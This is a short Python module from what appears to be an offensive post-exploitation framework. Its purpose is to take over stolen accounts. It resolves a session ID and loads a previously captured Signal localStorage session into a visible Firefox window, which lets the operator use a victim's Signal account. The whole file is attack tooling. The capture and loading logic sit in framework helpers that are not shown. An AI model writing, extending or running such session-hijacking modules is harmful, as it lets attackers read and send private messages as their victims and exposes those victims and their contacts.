# -*- coding: utf-8 -*-
# Signal post-exploitation module
# Operates on a previously captured Signal localStorage session.
from core.color import error, status
from core.module_utils import load_post_session, resolve_post_session, types


class info:
    author = "Puneet Chandra Chaudhary - D0C70R"
    short_description = "Signal post-session interaction (open captured session)"
    full_description = (
        "Loads a previously captured Signal localStorage session into a "
        "visible Firefox browser window. "
        "Set session_id to the ID shown by 'sessions -l'."
    )


class execution:
    module_type = types.post
    name = "signal"
    url = "https://signal.me/#p/linked-devices"
    session_type = "localstorage"

    @staticmethod
    def run(global_options, visible_browser):
        """Open the captured Signal session in a visible browser window."""
        try:
            session_id = resolve_post_session(
                global_options, module_name="signal", session_type="localstorage"
            )
        except Exception as exc:
            error(str(exc))
            return

        status(f"Loading Signal session [{session_id}]...")
        load_post_session("localstorage", session_id, visible_browser)
